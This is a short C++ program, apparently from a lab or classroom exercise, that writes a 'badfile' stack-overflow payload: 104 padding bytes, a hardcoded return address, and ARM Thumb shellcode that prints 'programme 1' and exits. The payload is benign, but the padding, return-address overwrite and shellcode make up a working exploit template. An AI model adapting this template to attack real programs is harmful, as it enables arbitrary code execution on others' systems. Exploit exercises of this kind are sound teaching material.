#include <iostream>
using namespace std;
#define MY_TMP_FILE "badfile"
enum { FILE_MODE = 0600 };



int main(){
	FILE* fd;
	fd=fopen(MY_TMP_FILE, "w");

	for (int i=0;i<104;i++){
		fputc('a',fd);
	}
	unsigned char adress[]= {0xf0,0xf3,0xff,0x7e};//0x7efff384 + 0d108 (6c en hexa) = 7efff410
	for (int i=0;i<4;i++){
		fputc(adress[i],fd);
	}

	unsigned char shell2_bin[] = {
	0x01, 0x60, 0x8f, 0xe2, 0x16, 0xff, 0x2f, 0xe1, 0x04, 0x27, 0x01, 0x20,
	0x79, 0x46, 0x0a, 0x31, 0x0b, 0x22, 0x01, 0xdf, 0x01, 0x27, 0x01, 0x20,
	0x01, 0xdf, 0x70, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x6d, 0x65, 0x20,
	0x31, 0x00, 0xc0, 0x46
	};
	unsigned int shell2_bin_len = 40;

	for (int i=0;i<shell2_bin_len;i++){
		fputc(shell2_bin[i],fd);
	}

	return 0;
}
